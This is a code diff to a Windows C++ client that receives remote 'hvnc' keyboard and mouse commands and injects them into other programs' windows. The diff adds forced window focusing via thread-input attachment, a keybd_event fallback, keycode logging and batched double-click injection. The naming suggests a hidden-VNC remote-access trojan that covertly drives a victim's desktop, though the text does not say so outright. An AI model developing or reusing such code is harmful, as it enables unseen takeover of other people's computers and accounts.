@@ -792,11 +792,16 @@ static bool send_key_input(WORD vk, bool down) {
         case VK_PRIOR: case VK_NEXT: case VK_END: case VK_HOME:
         case VK_INSERT: case VK_DELETE: case VK_DIVIDE: case VK_NUMLOCK:
         case VK_RCONTROL: case VK_RMENU:
+        case VK_LWIN: case VK_RWIN: case VK_APPS:
             input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
             break;
     }
 
-    return SendInput(1, &input, sizeof(INPUT)) == 1;
+    if (SendInput(1, &input, sizeof(INPUT)) == 0) {
+        client_log("SendInput failed, error=" + to_string(GetLastError()));
+        keybd_event((BYTE)vk, (BYTE)input.ki.wScan, input.ki.dwFlags, 0);
+    }
+    return true;
 }
 
 static bool send_unicode_input(WCHAR ch) {
@@ -862,37 +867,42 @@ static HWND target_window_from_screen_point(POINT screenPt) {
     return resolve_child_window_from_point(hwnd, screenPt);
 }
 
+static void focus_window(HWND hwnd) {
+    if (!hwnd || !IsWindow(hwnd)) return;
+    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+    if (!hRoot) hRoot = hwnd;
+
+    DWORD targetThreadId = GetWindowThreadProcessId(hRoot, NULL);
+    DWORD currentThreadId = GetCurrentThreadId();
+
+    AllowSetForegroundWindow(ASFW_ANY);
+    SetWindowPos(hRoot, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
+
+    if (targetThreadId != currentThreadId) {
+        AttachThreadInput(currentThreadId, targetThreadId, TRUE);
+        SetForegroundWindow(hRoot);
+        SetActiveWindow(hRoot);
+        SetFocus(hwnd);
+        AttachThreadInput(currentThreadId, targetThreadId, FALSE);
+    } else {
+        SetForegroundWindow(hRoot);
+        SetActiveWindow(hRoot);
+        SetFocus(hwnd);
+    }
+}
+
 static void activate_target_window(HWND hTarget, UINT mouseMsg, LRESULT hitTest) {
     if (!hTarget || !IsWindow(hTarget)) return;
 
     HWND hRoot = GetAncestor(hTarget, GA_ROOT);
     if (!hRoot || !IsWindow(hRoot)) hRoot = hTarget;
     g_hLastWindow = hRoot;
+    g_hCurrentFocus = hTarget;
 
-    HWND hFore = GetForegroundWindow();
-    if (hFore != hRoot) {
-        DWORD foreThreadId = hFore ? GetWindowThreadProcessId(hFore, NULL) : 0;
-        DWORD targetThreadId = GetWindowThreadProcessId(hRoot, NULL);
-        DWORD currentThreadId = GetCurrentThreadId();
-
-        if (foreThreadId && foreThreadId != targetThreadId) {
-            AttachThreadInput(targetThreadId, foreThreadId, TRUE);
-            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
-            AllowSetForegroundWindow(ASFW_ANY);
-            SetForegroundWindow(hRoot);
-            SetActiveWindow(hRoot);
-            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
-            AttachThreadInput(targetThreadId, foreThreadId, FALSE);
-        } else {
-            SetForegroundWindow(hRoot);
-            SetActiveWindow(hRoot);
-        }
-    }
+    focus_window(hTarget);
 
     PostMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(hitTest, mouseMsg));
     PostMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hRoot);
-    SetFocus(hTarget);
-    g_hCurrentFocus = hTarget;
 }
 
 // -----------------------------------------------------------------------
@@ -937,17 +947,14 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
+            client_log("Keyboard action=" + action + " vk=" + to_string(vk));
 
             HWND hTarget = g_hCurrentFocus;
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
             if (!hTarget || !IsWindow(hTarget)) hTarget = g_hLastWindow;
 
             if (hTarget && IsWindow(hTarget)) {
-                HWND hRoot = GetAncestor(hTarget, GA_ROOT);
-                if (hRoot) {
-                    SetForegroundWindow(hRoot);
-                    if (hTarget != hRoot) SetFocus(hTarget);
-                }
+                focus_window(hTarget);
             }
 
             if (action == "hvnc_keydown") {
@@ -1094,11 +1101,14 @@ static void input_loop() {
             int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
 
-            // For double click, we just send the sequence via SendInput
-            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
-            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
-            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
-            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
+            INPUT inputs[4]{};
+            for (int i = 0; i < 4; i++) {
+                inputs[i].type = INPUT_MOUSE;
+                inputs[i].mi.dx = normX;
+                inputs[i].mi.dy = normY;
+                inputs[i].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | mouse_button_flag(btn, (i % 2 == 0));
+            }
+            SendInput(4, inputs, sizeof(INPUT));
             continue;
         }
     }
